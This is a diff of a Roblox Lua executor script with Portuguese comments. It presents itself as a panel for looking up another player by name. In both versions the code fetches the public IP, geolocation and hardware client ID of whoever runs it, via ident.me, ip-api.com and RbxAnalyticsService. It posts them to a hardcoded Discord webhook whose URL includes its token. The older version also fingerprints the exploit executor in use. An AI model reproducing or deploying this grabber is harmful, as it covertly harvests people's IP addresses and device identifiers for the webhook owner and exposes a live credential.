@@ -1,62 +1,113 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local player = Players.LocalPlayer
-local GuiService = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
 
--- Criando a interface do usuário (GUI)
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player.PlayerGui
+-- Função para criar o painel
+local function createTextBoxPanel()
+    -- Criar a tela e a estrutura
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Painel de texto para digitar o nome do jogador
-local nameInput = Instance.new("TextBox")
-nameInput.Parent = screenGui
-nameInput.Size = UDim2.new(0, 400, 0, 50)
-nameInput.Position = UDim2.new(0.5, -200, 0.5, -25)
-nameInput.PlaceholderText = "Digite o nome do jogador"
-nameInput.TextScaled = true
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.5
+    frame.Parent = screenGui
 
--- Botão para enviar o nome e coletar as informações
-local submitButton = Instance.new("TextButton")
-submitButton.Parent = screenGui
-submitButton.Size = UDim2.new(0, 200, 0, 50)
-submitButton.Position = UDim2.new(0.5, -100, 0.5, 30)
-submitButton.Text = "Coletar Informações"
-submitButton.TextScaled = true
+    -- Criar a caixa de texto para o nome do jogador
+    local textBox = Instance.new("TextBox")
+    textBox.Size = UDim2.new(0, 280, 0, 40)
+    textBox.Position = UDim2.new(0, 10, 0, 40)
+    textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    textBox.PlaceholderText = "Digite o nome do jogador"
+    textBox.ClearTextOnFocus = false
+    textBox.Parent = frame
 
--- Função para coletar informações sobre o jogador
-local function getPlayerInfo(playerName)
-    local targetPlayer = Players:FindFirstChild(playerName)
-    if targetPlayer then
-        local Userid = targetPlayer.UserId
-        local DName = targetPlayer.DisplayName
-        local Name = targetPlayer.Name
-        local MembershipType = tostring(targetPlayer.MembershipType):sub(21)
-        local AccountAge = targetPlayer.AccountAge
-        local Country = game.LocalizationService.RobloxLocaleId
-        local GetIp = game:HttpGet("https://v4.ident.me/")
-        local GetData = game:HttpGet("http://ip-api.com/json")
-        local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    -- Criar o botão de enviar
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 280, 0, 40)
+    button.Position = UDim2.new(0, 10, 0, 90)
+    button.Text = "Enviar"
+    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    button.Parent = frame
 
-        -- Informações do jogo
-        local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    -- Variáveis para arrastar o painel
+    local dragging = false
+    local dragInput, mouseDelta, dragStart
 
-        -- Detectando Executor
-        local function detectExecutor()
-            local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-                            or (secure_load and "Sentinel")
-                            or (pebc_execute and "ProtoSmasher")
-                            or (KRNL_LOADED and "Krnl")
-                            or (is_sirhurt_closure and "SirHurt")
-                            or (identifyexecutor():find("ScriptWare") and "Script-Ware")
-                            or "Unsupported"
-            return executor
+    -- Função para iniciar o arrasto
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            dragInput = input
+        end
+    end)
+
+    -- Função para atualizar a posição enquanto arrasta
+    frame.InputChanged:Connect(function(input)
+        if dragging and input == dragInput then
+            mouseDelta = input.Position - dragStart
+            frame.Position = UDim2.new(frame.Position.X.Scale, mouseDelta.X, frame.Position.Y.Scale, mouseDelta.Y)
+        end
+    end)
+
+    -- Função para finalizar o arrasto
+    frame.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+
+    -- Função para capturar as informações do jogador
+    button.MouseButton1Click:Connect(function()
+        local playerName = textBox.Text
+        if playerName == "" then
+            print("Digite um nome de jogador válido!")
+            return
         end
 
-        -- Criando os dados para o Webhook
-        local function createWebhookData()
-            local webhookcheck = detectExecutor()
-            
+        -- Função para pegar as informações do jogador
+        local function getPlayerInfo(playerName)
+            local player = Players:FindFirstChild(playerName)
+            if not player then
+                return nil, "Jogador não encontrado."
+            end
+
+            -- Coleta as informações reais do jogador
+            local Userid = player.UserId
+            local DName = player.DisplayName
+            local Name = player.Name
+            local MembershipType = tostring(player.MembershipType):sub(21)
+            local AccountAge = player.AccountAge
+            local Country = game.LocalizationService.RobloxLocaleId
+            local GetIp = game:HttpGet("https://v4.ident.me/") -- Informações de IP
+            local GetData = game:HttpGet("http://ip-api.com/json") -- Dados do IP
+            local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+            local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+            -- Game Info
+            local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+            return {
+                Userid = Userid,
+                DName = DName,
+                Name = Name,
+                MembershipType = MembershipType,
+                AccountAge = AccountAge,
+                Country = Country,
+                GetIp = GetIp,
+                GetData = GetData,
+                GetHwid = GetHwid,
+                GAMENAME = GAMENAME,
+                ConsoleJobId = ConsoleJobId
+            }
+        end
+
+        -- Função para criar os dados do webhook
+        local function createWebhookData(playerInfo)
             local data = {
                 ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                 ["content"] = "",
@@ -67,56 +118,54 @@ local function getPlayerInfo(playerName)
                             ["url"] = "https://roblox.com",
                         },
                         ["description"] = string.format(
-                            "__[Player Info](https://www.roblox.com/users/%d)__" .. 
+                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
                             " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                            "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                            "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
                             "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                            "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                            "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
-                            Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                            "\n**Game:** %s \n**Game Id**: %d \n**JobId:** %s",
+                            playerInfo.Userid, playerInfo.DName, playerInfo.Name, playerInfo.Userid, playerInfo.MembershipType, 
+                            playerInfo.AccountAge, playerInfo.Country, playerInfo.GetIp, playerInfo.GetHwid,
                             tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                            game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                            GetData, "JobIdExample"
+                            game.PlaceId, playerInfo.GAMENAME, game.PlaceId, playerInfo.ConsoleJobId
                         ),
                         ["type"] = "rich",
-                        ["color"] = tonumber("0xFFD700"),
+                        ["color"] = tonumber("0xFFD700"), -- Cor
                         ["thumbnail"] = {
-                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerInfo.Userid.."&width=150&height=150&format=png"
                         },
                     }
                 }
             }
+
             return HttpService:JSONEncode(data)
         end
 
-        -- Função para enviar o Webhook
+        -- Função para enviar o webhook para o Discord
         local function sendWebhook(webhookUrl, data)
             local headers = {
                 ["content-type"] = "application/json"
             }
-
             local request = http_request or request or HttpPost or syn.request
-            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-            request(abcdef)
+            local requestData = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+            request(requestData)
         end
 
-        -- Seu Webhook
-        local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
-        local webhookData = createWebhookData()
+        -- Captura as informações do jogador
+        local playerInfo, err = getPlayerInfo(playerName)
+        if not playerInfo then
+            print("Erro ao encontrar o jogador: " .. err)
+            return
+        end
 
-        -- Enviar os dados para o Webhook
+        -- Substitua com sua URL de webhook
+        local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
+        local webhookData = createWebhookData(playerInfo)
         sendWebhook(webhookUrl, webhookData)
-    else
-        print("Jogador não encontrado.")
-    end
+
+        -- Avisar que os dados foram enviados
+        print("Informações enviadas para o Discord!")
+    end)
 end
 
--- Função para tratar o evento de clique no botão
-submitButton.MouseButton1Click:Connect(function()
-    local playerName = nameInput.Text
-    if playerName and playerName ~= "" then
-        getPlayerInfo(playerName)
-    else
-        print("Nome de jogador inválido.")
-    end
-end)
+-- Criar o painel de entrada de texto
+createTextBoxPanel()
